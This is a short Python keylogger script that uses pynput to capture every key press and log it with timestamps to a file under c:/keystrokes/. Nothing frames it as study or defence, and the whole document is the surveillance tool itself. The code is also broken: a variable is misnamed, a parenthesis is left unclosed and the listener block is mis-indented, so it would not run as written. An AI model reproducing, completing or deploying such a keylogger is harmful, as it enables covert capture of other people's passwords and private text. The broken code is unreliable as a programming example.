from pynput.keyboard import Key, Listener
import logging
from typing import Any

log_dir ="c:/keystrokes/"

logging.basicConfig(filename=(logdir+"logges.txt"),level=logging.DEBUG, format='%(asctime)s:%(message)s'
                    def on_press(key):

                        logging.info(key)
                    with Listener(on_press=on_press) as listener:
                        listener.join()

